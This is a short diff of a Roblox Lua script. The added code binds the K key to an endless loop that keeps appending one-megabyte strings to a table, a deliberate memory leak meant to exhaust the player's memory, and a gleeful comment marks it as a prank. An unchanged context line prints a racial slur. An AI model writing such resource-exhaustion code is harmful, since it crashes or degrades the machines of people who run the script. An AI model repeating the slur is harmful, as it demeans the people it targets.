@@ -24,8 +24,15 @@ print("nigga sandwhich #1")
 task.wait(0.05)
 end
 
-if input.KeyCode == Enum.KeyCode.K then
-    while true do 
-        return
+local UserInputService = game:GetService("UserInputService")
+
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+    if input.KeyCode == Enum.KeyCode.K and not gameProcessed then
+        local memoryLeak = {}
+        while true do
+            table.insert(memoryLeak, string.rep("A", 10^6)) -- 1mb memory per 0.0001 second HEHHEHEHEHEHEH
+        task.wait(0.05)
+        end
     end
-end
+end)
+
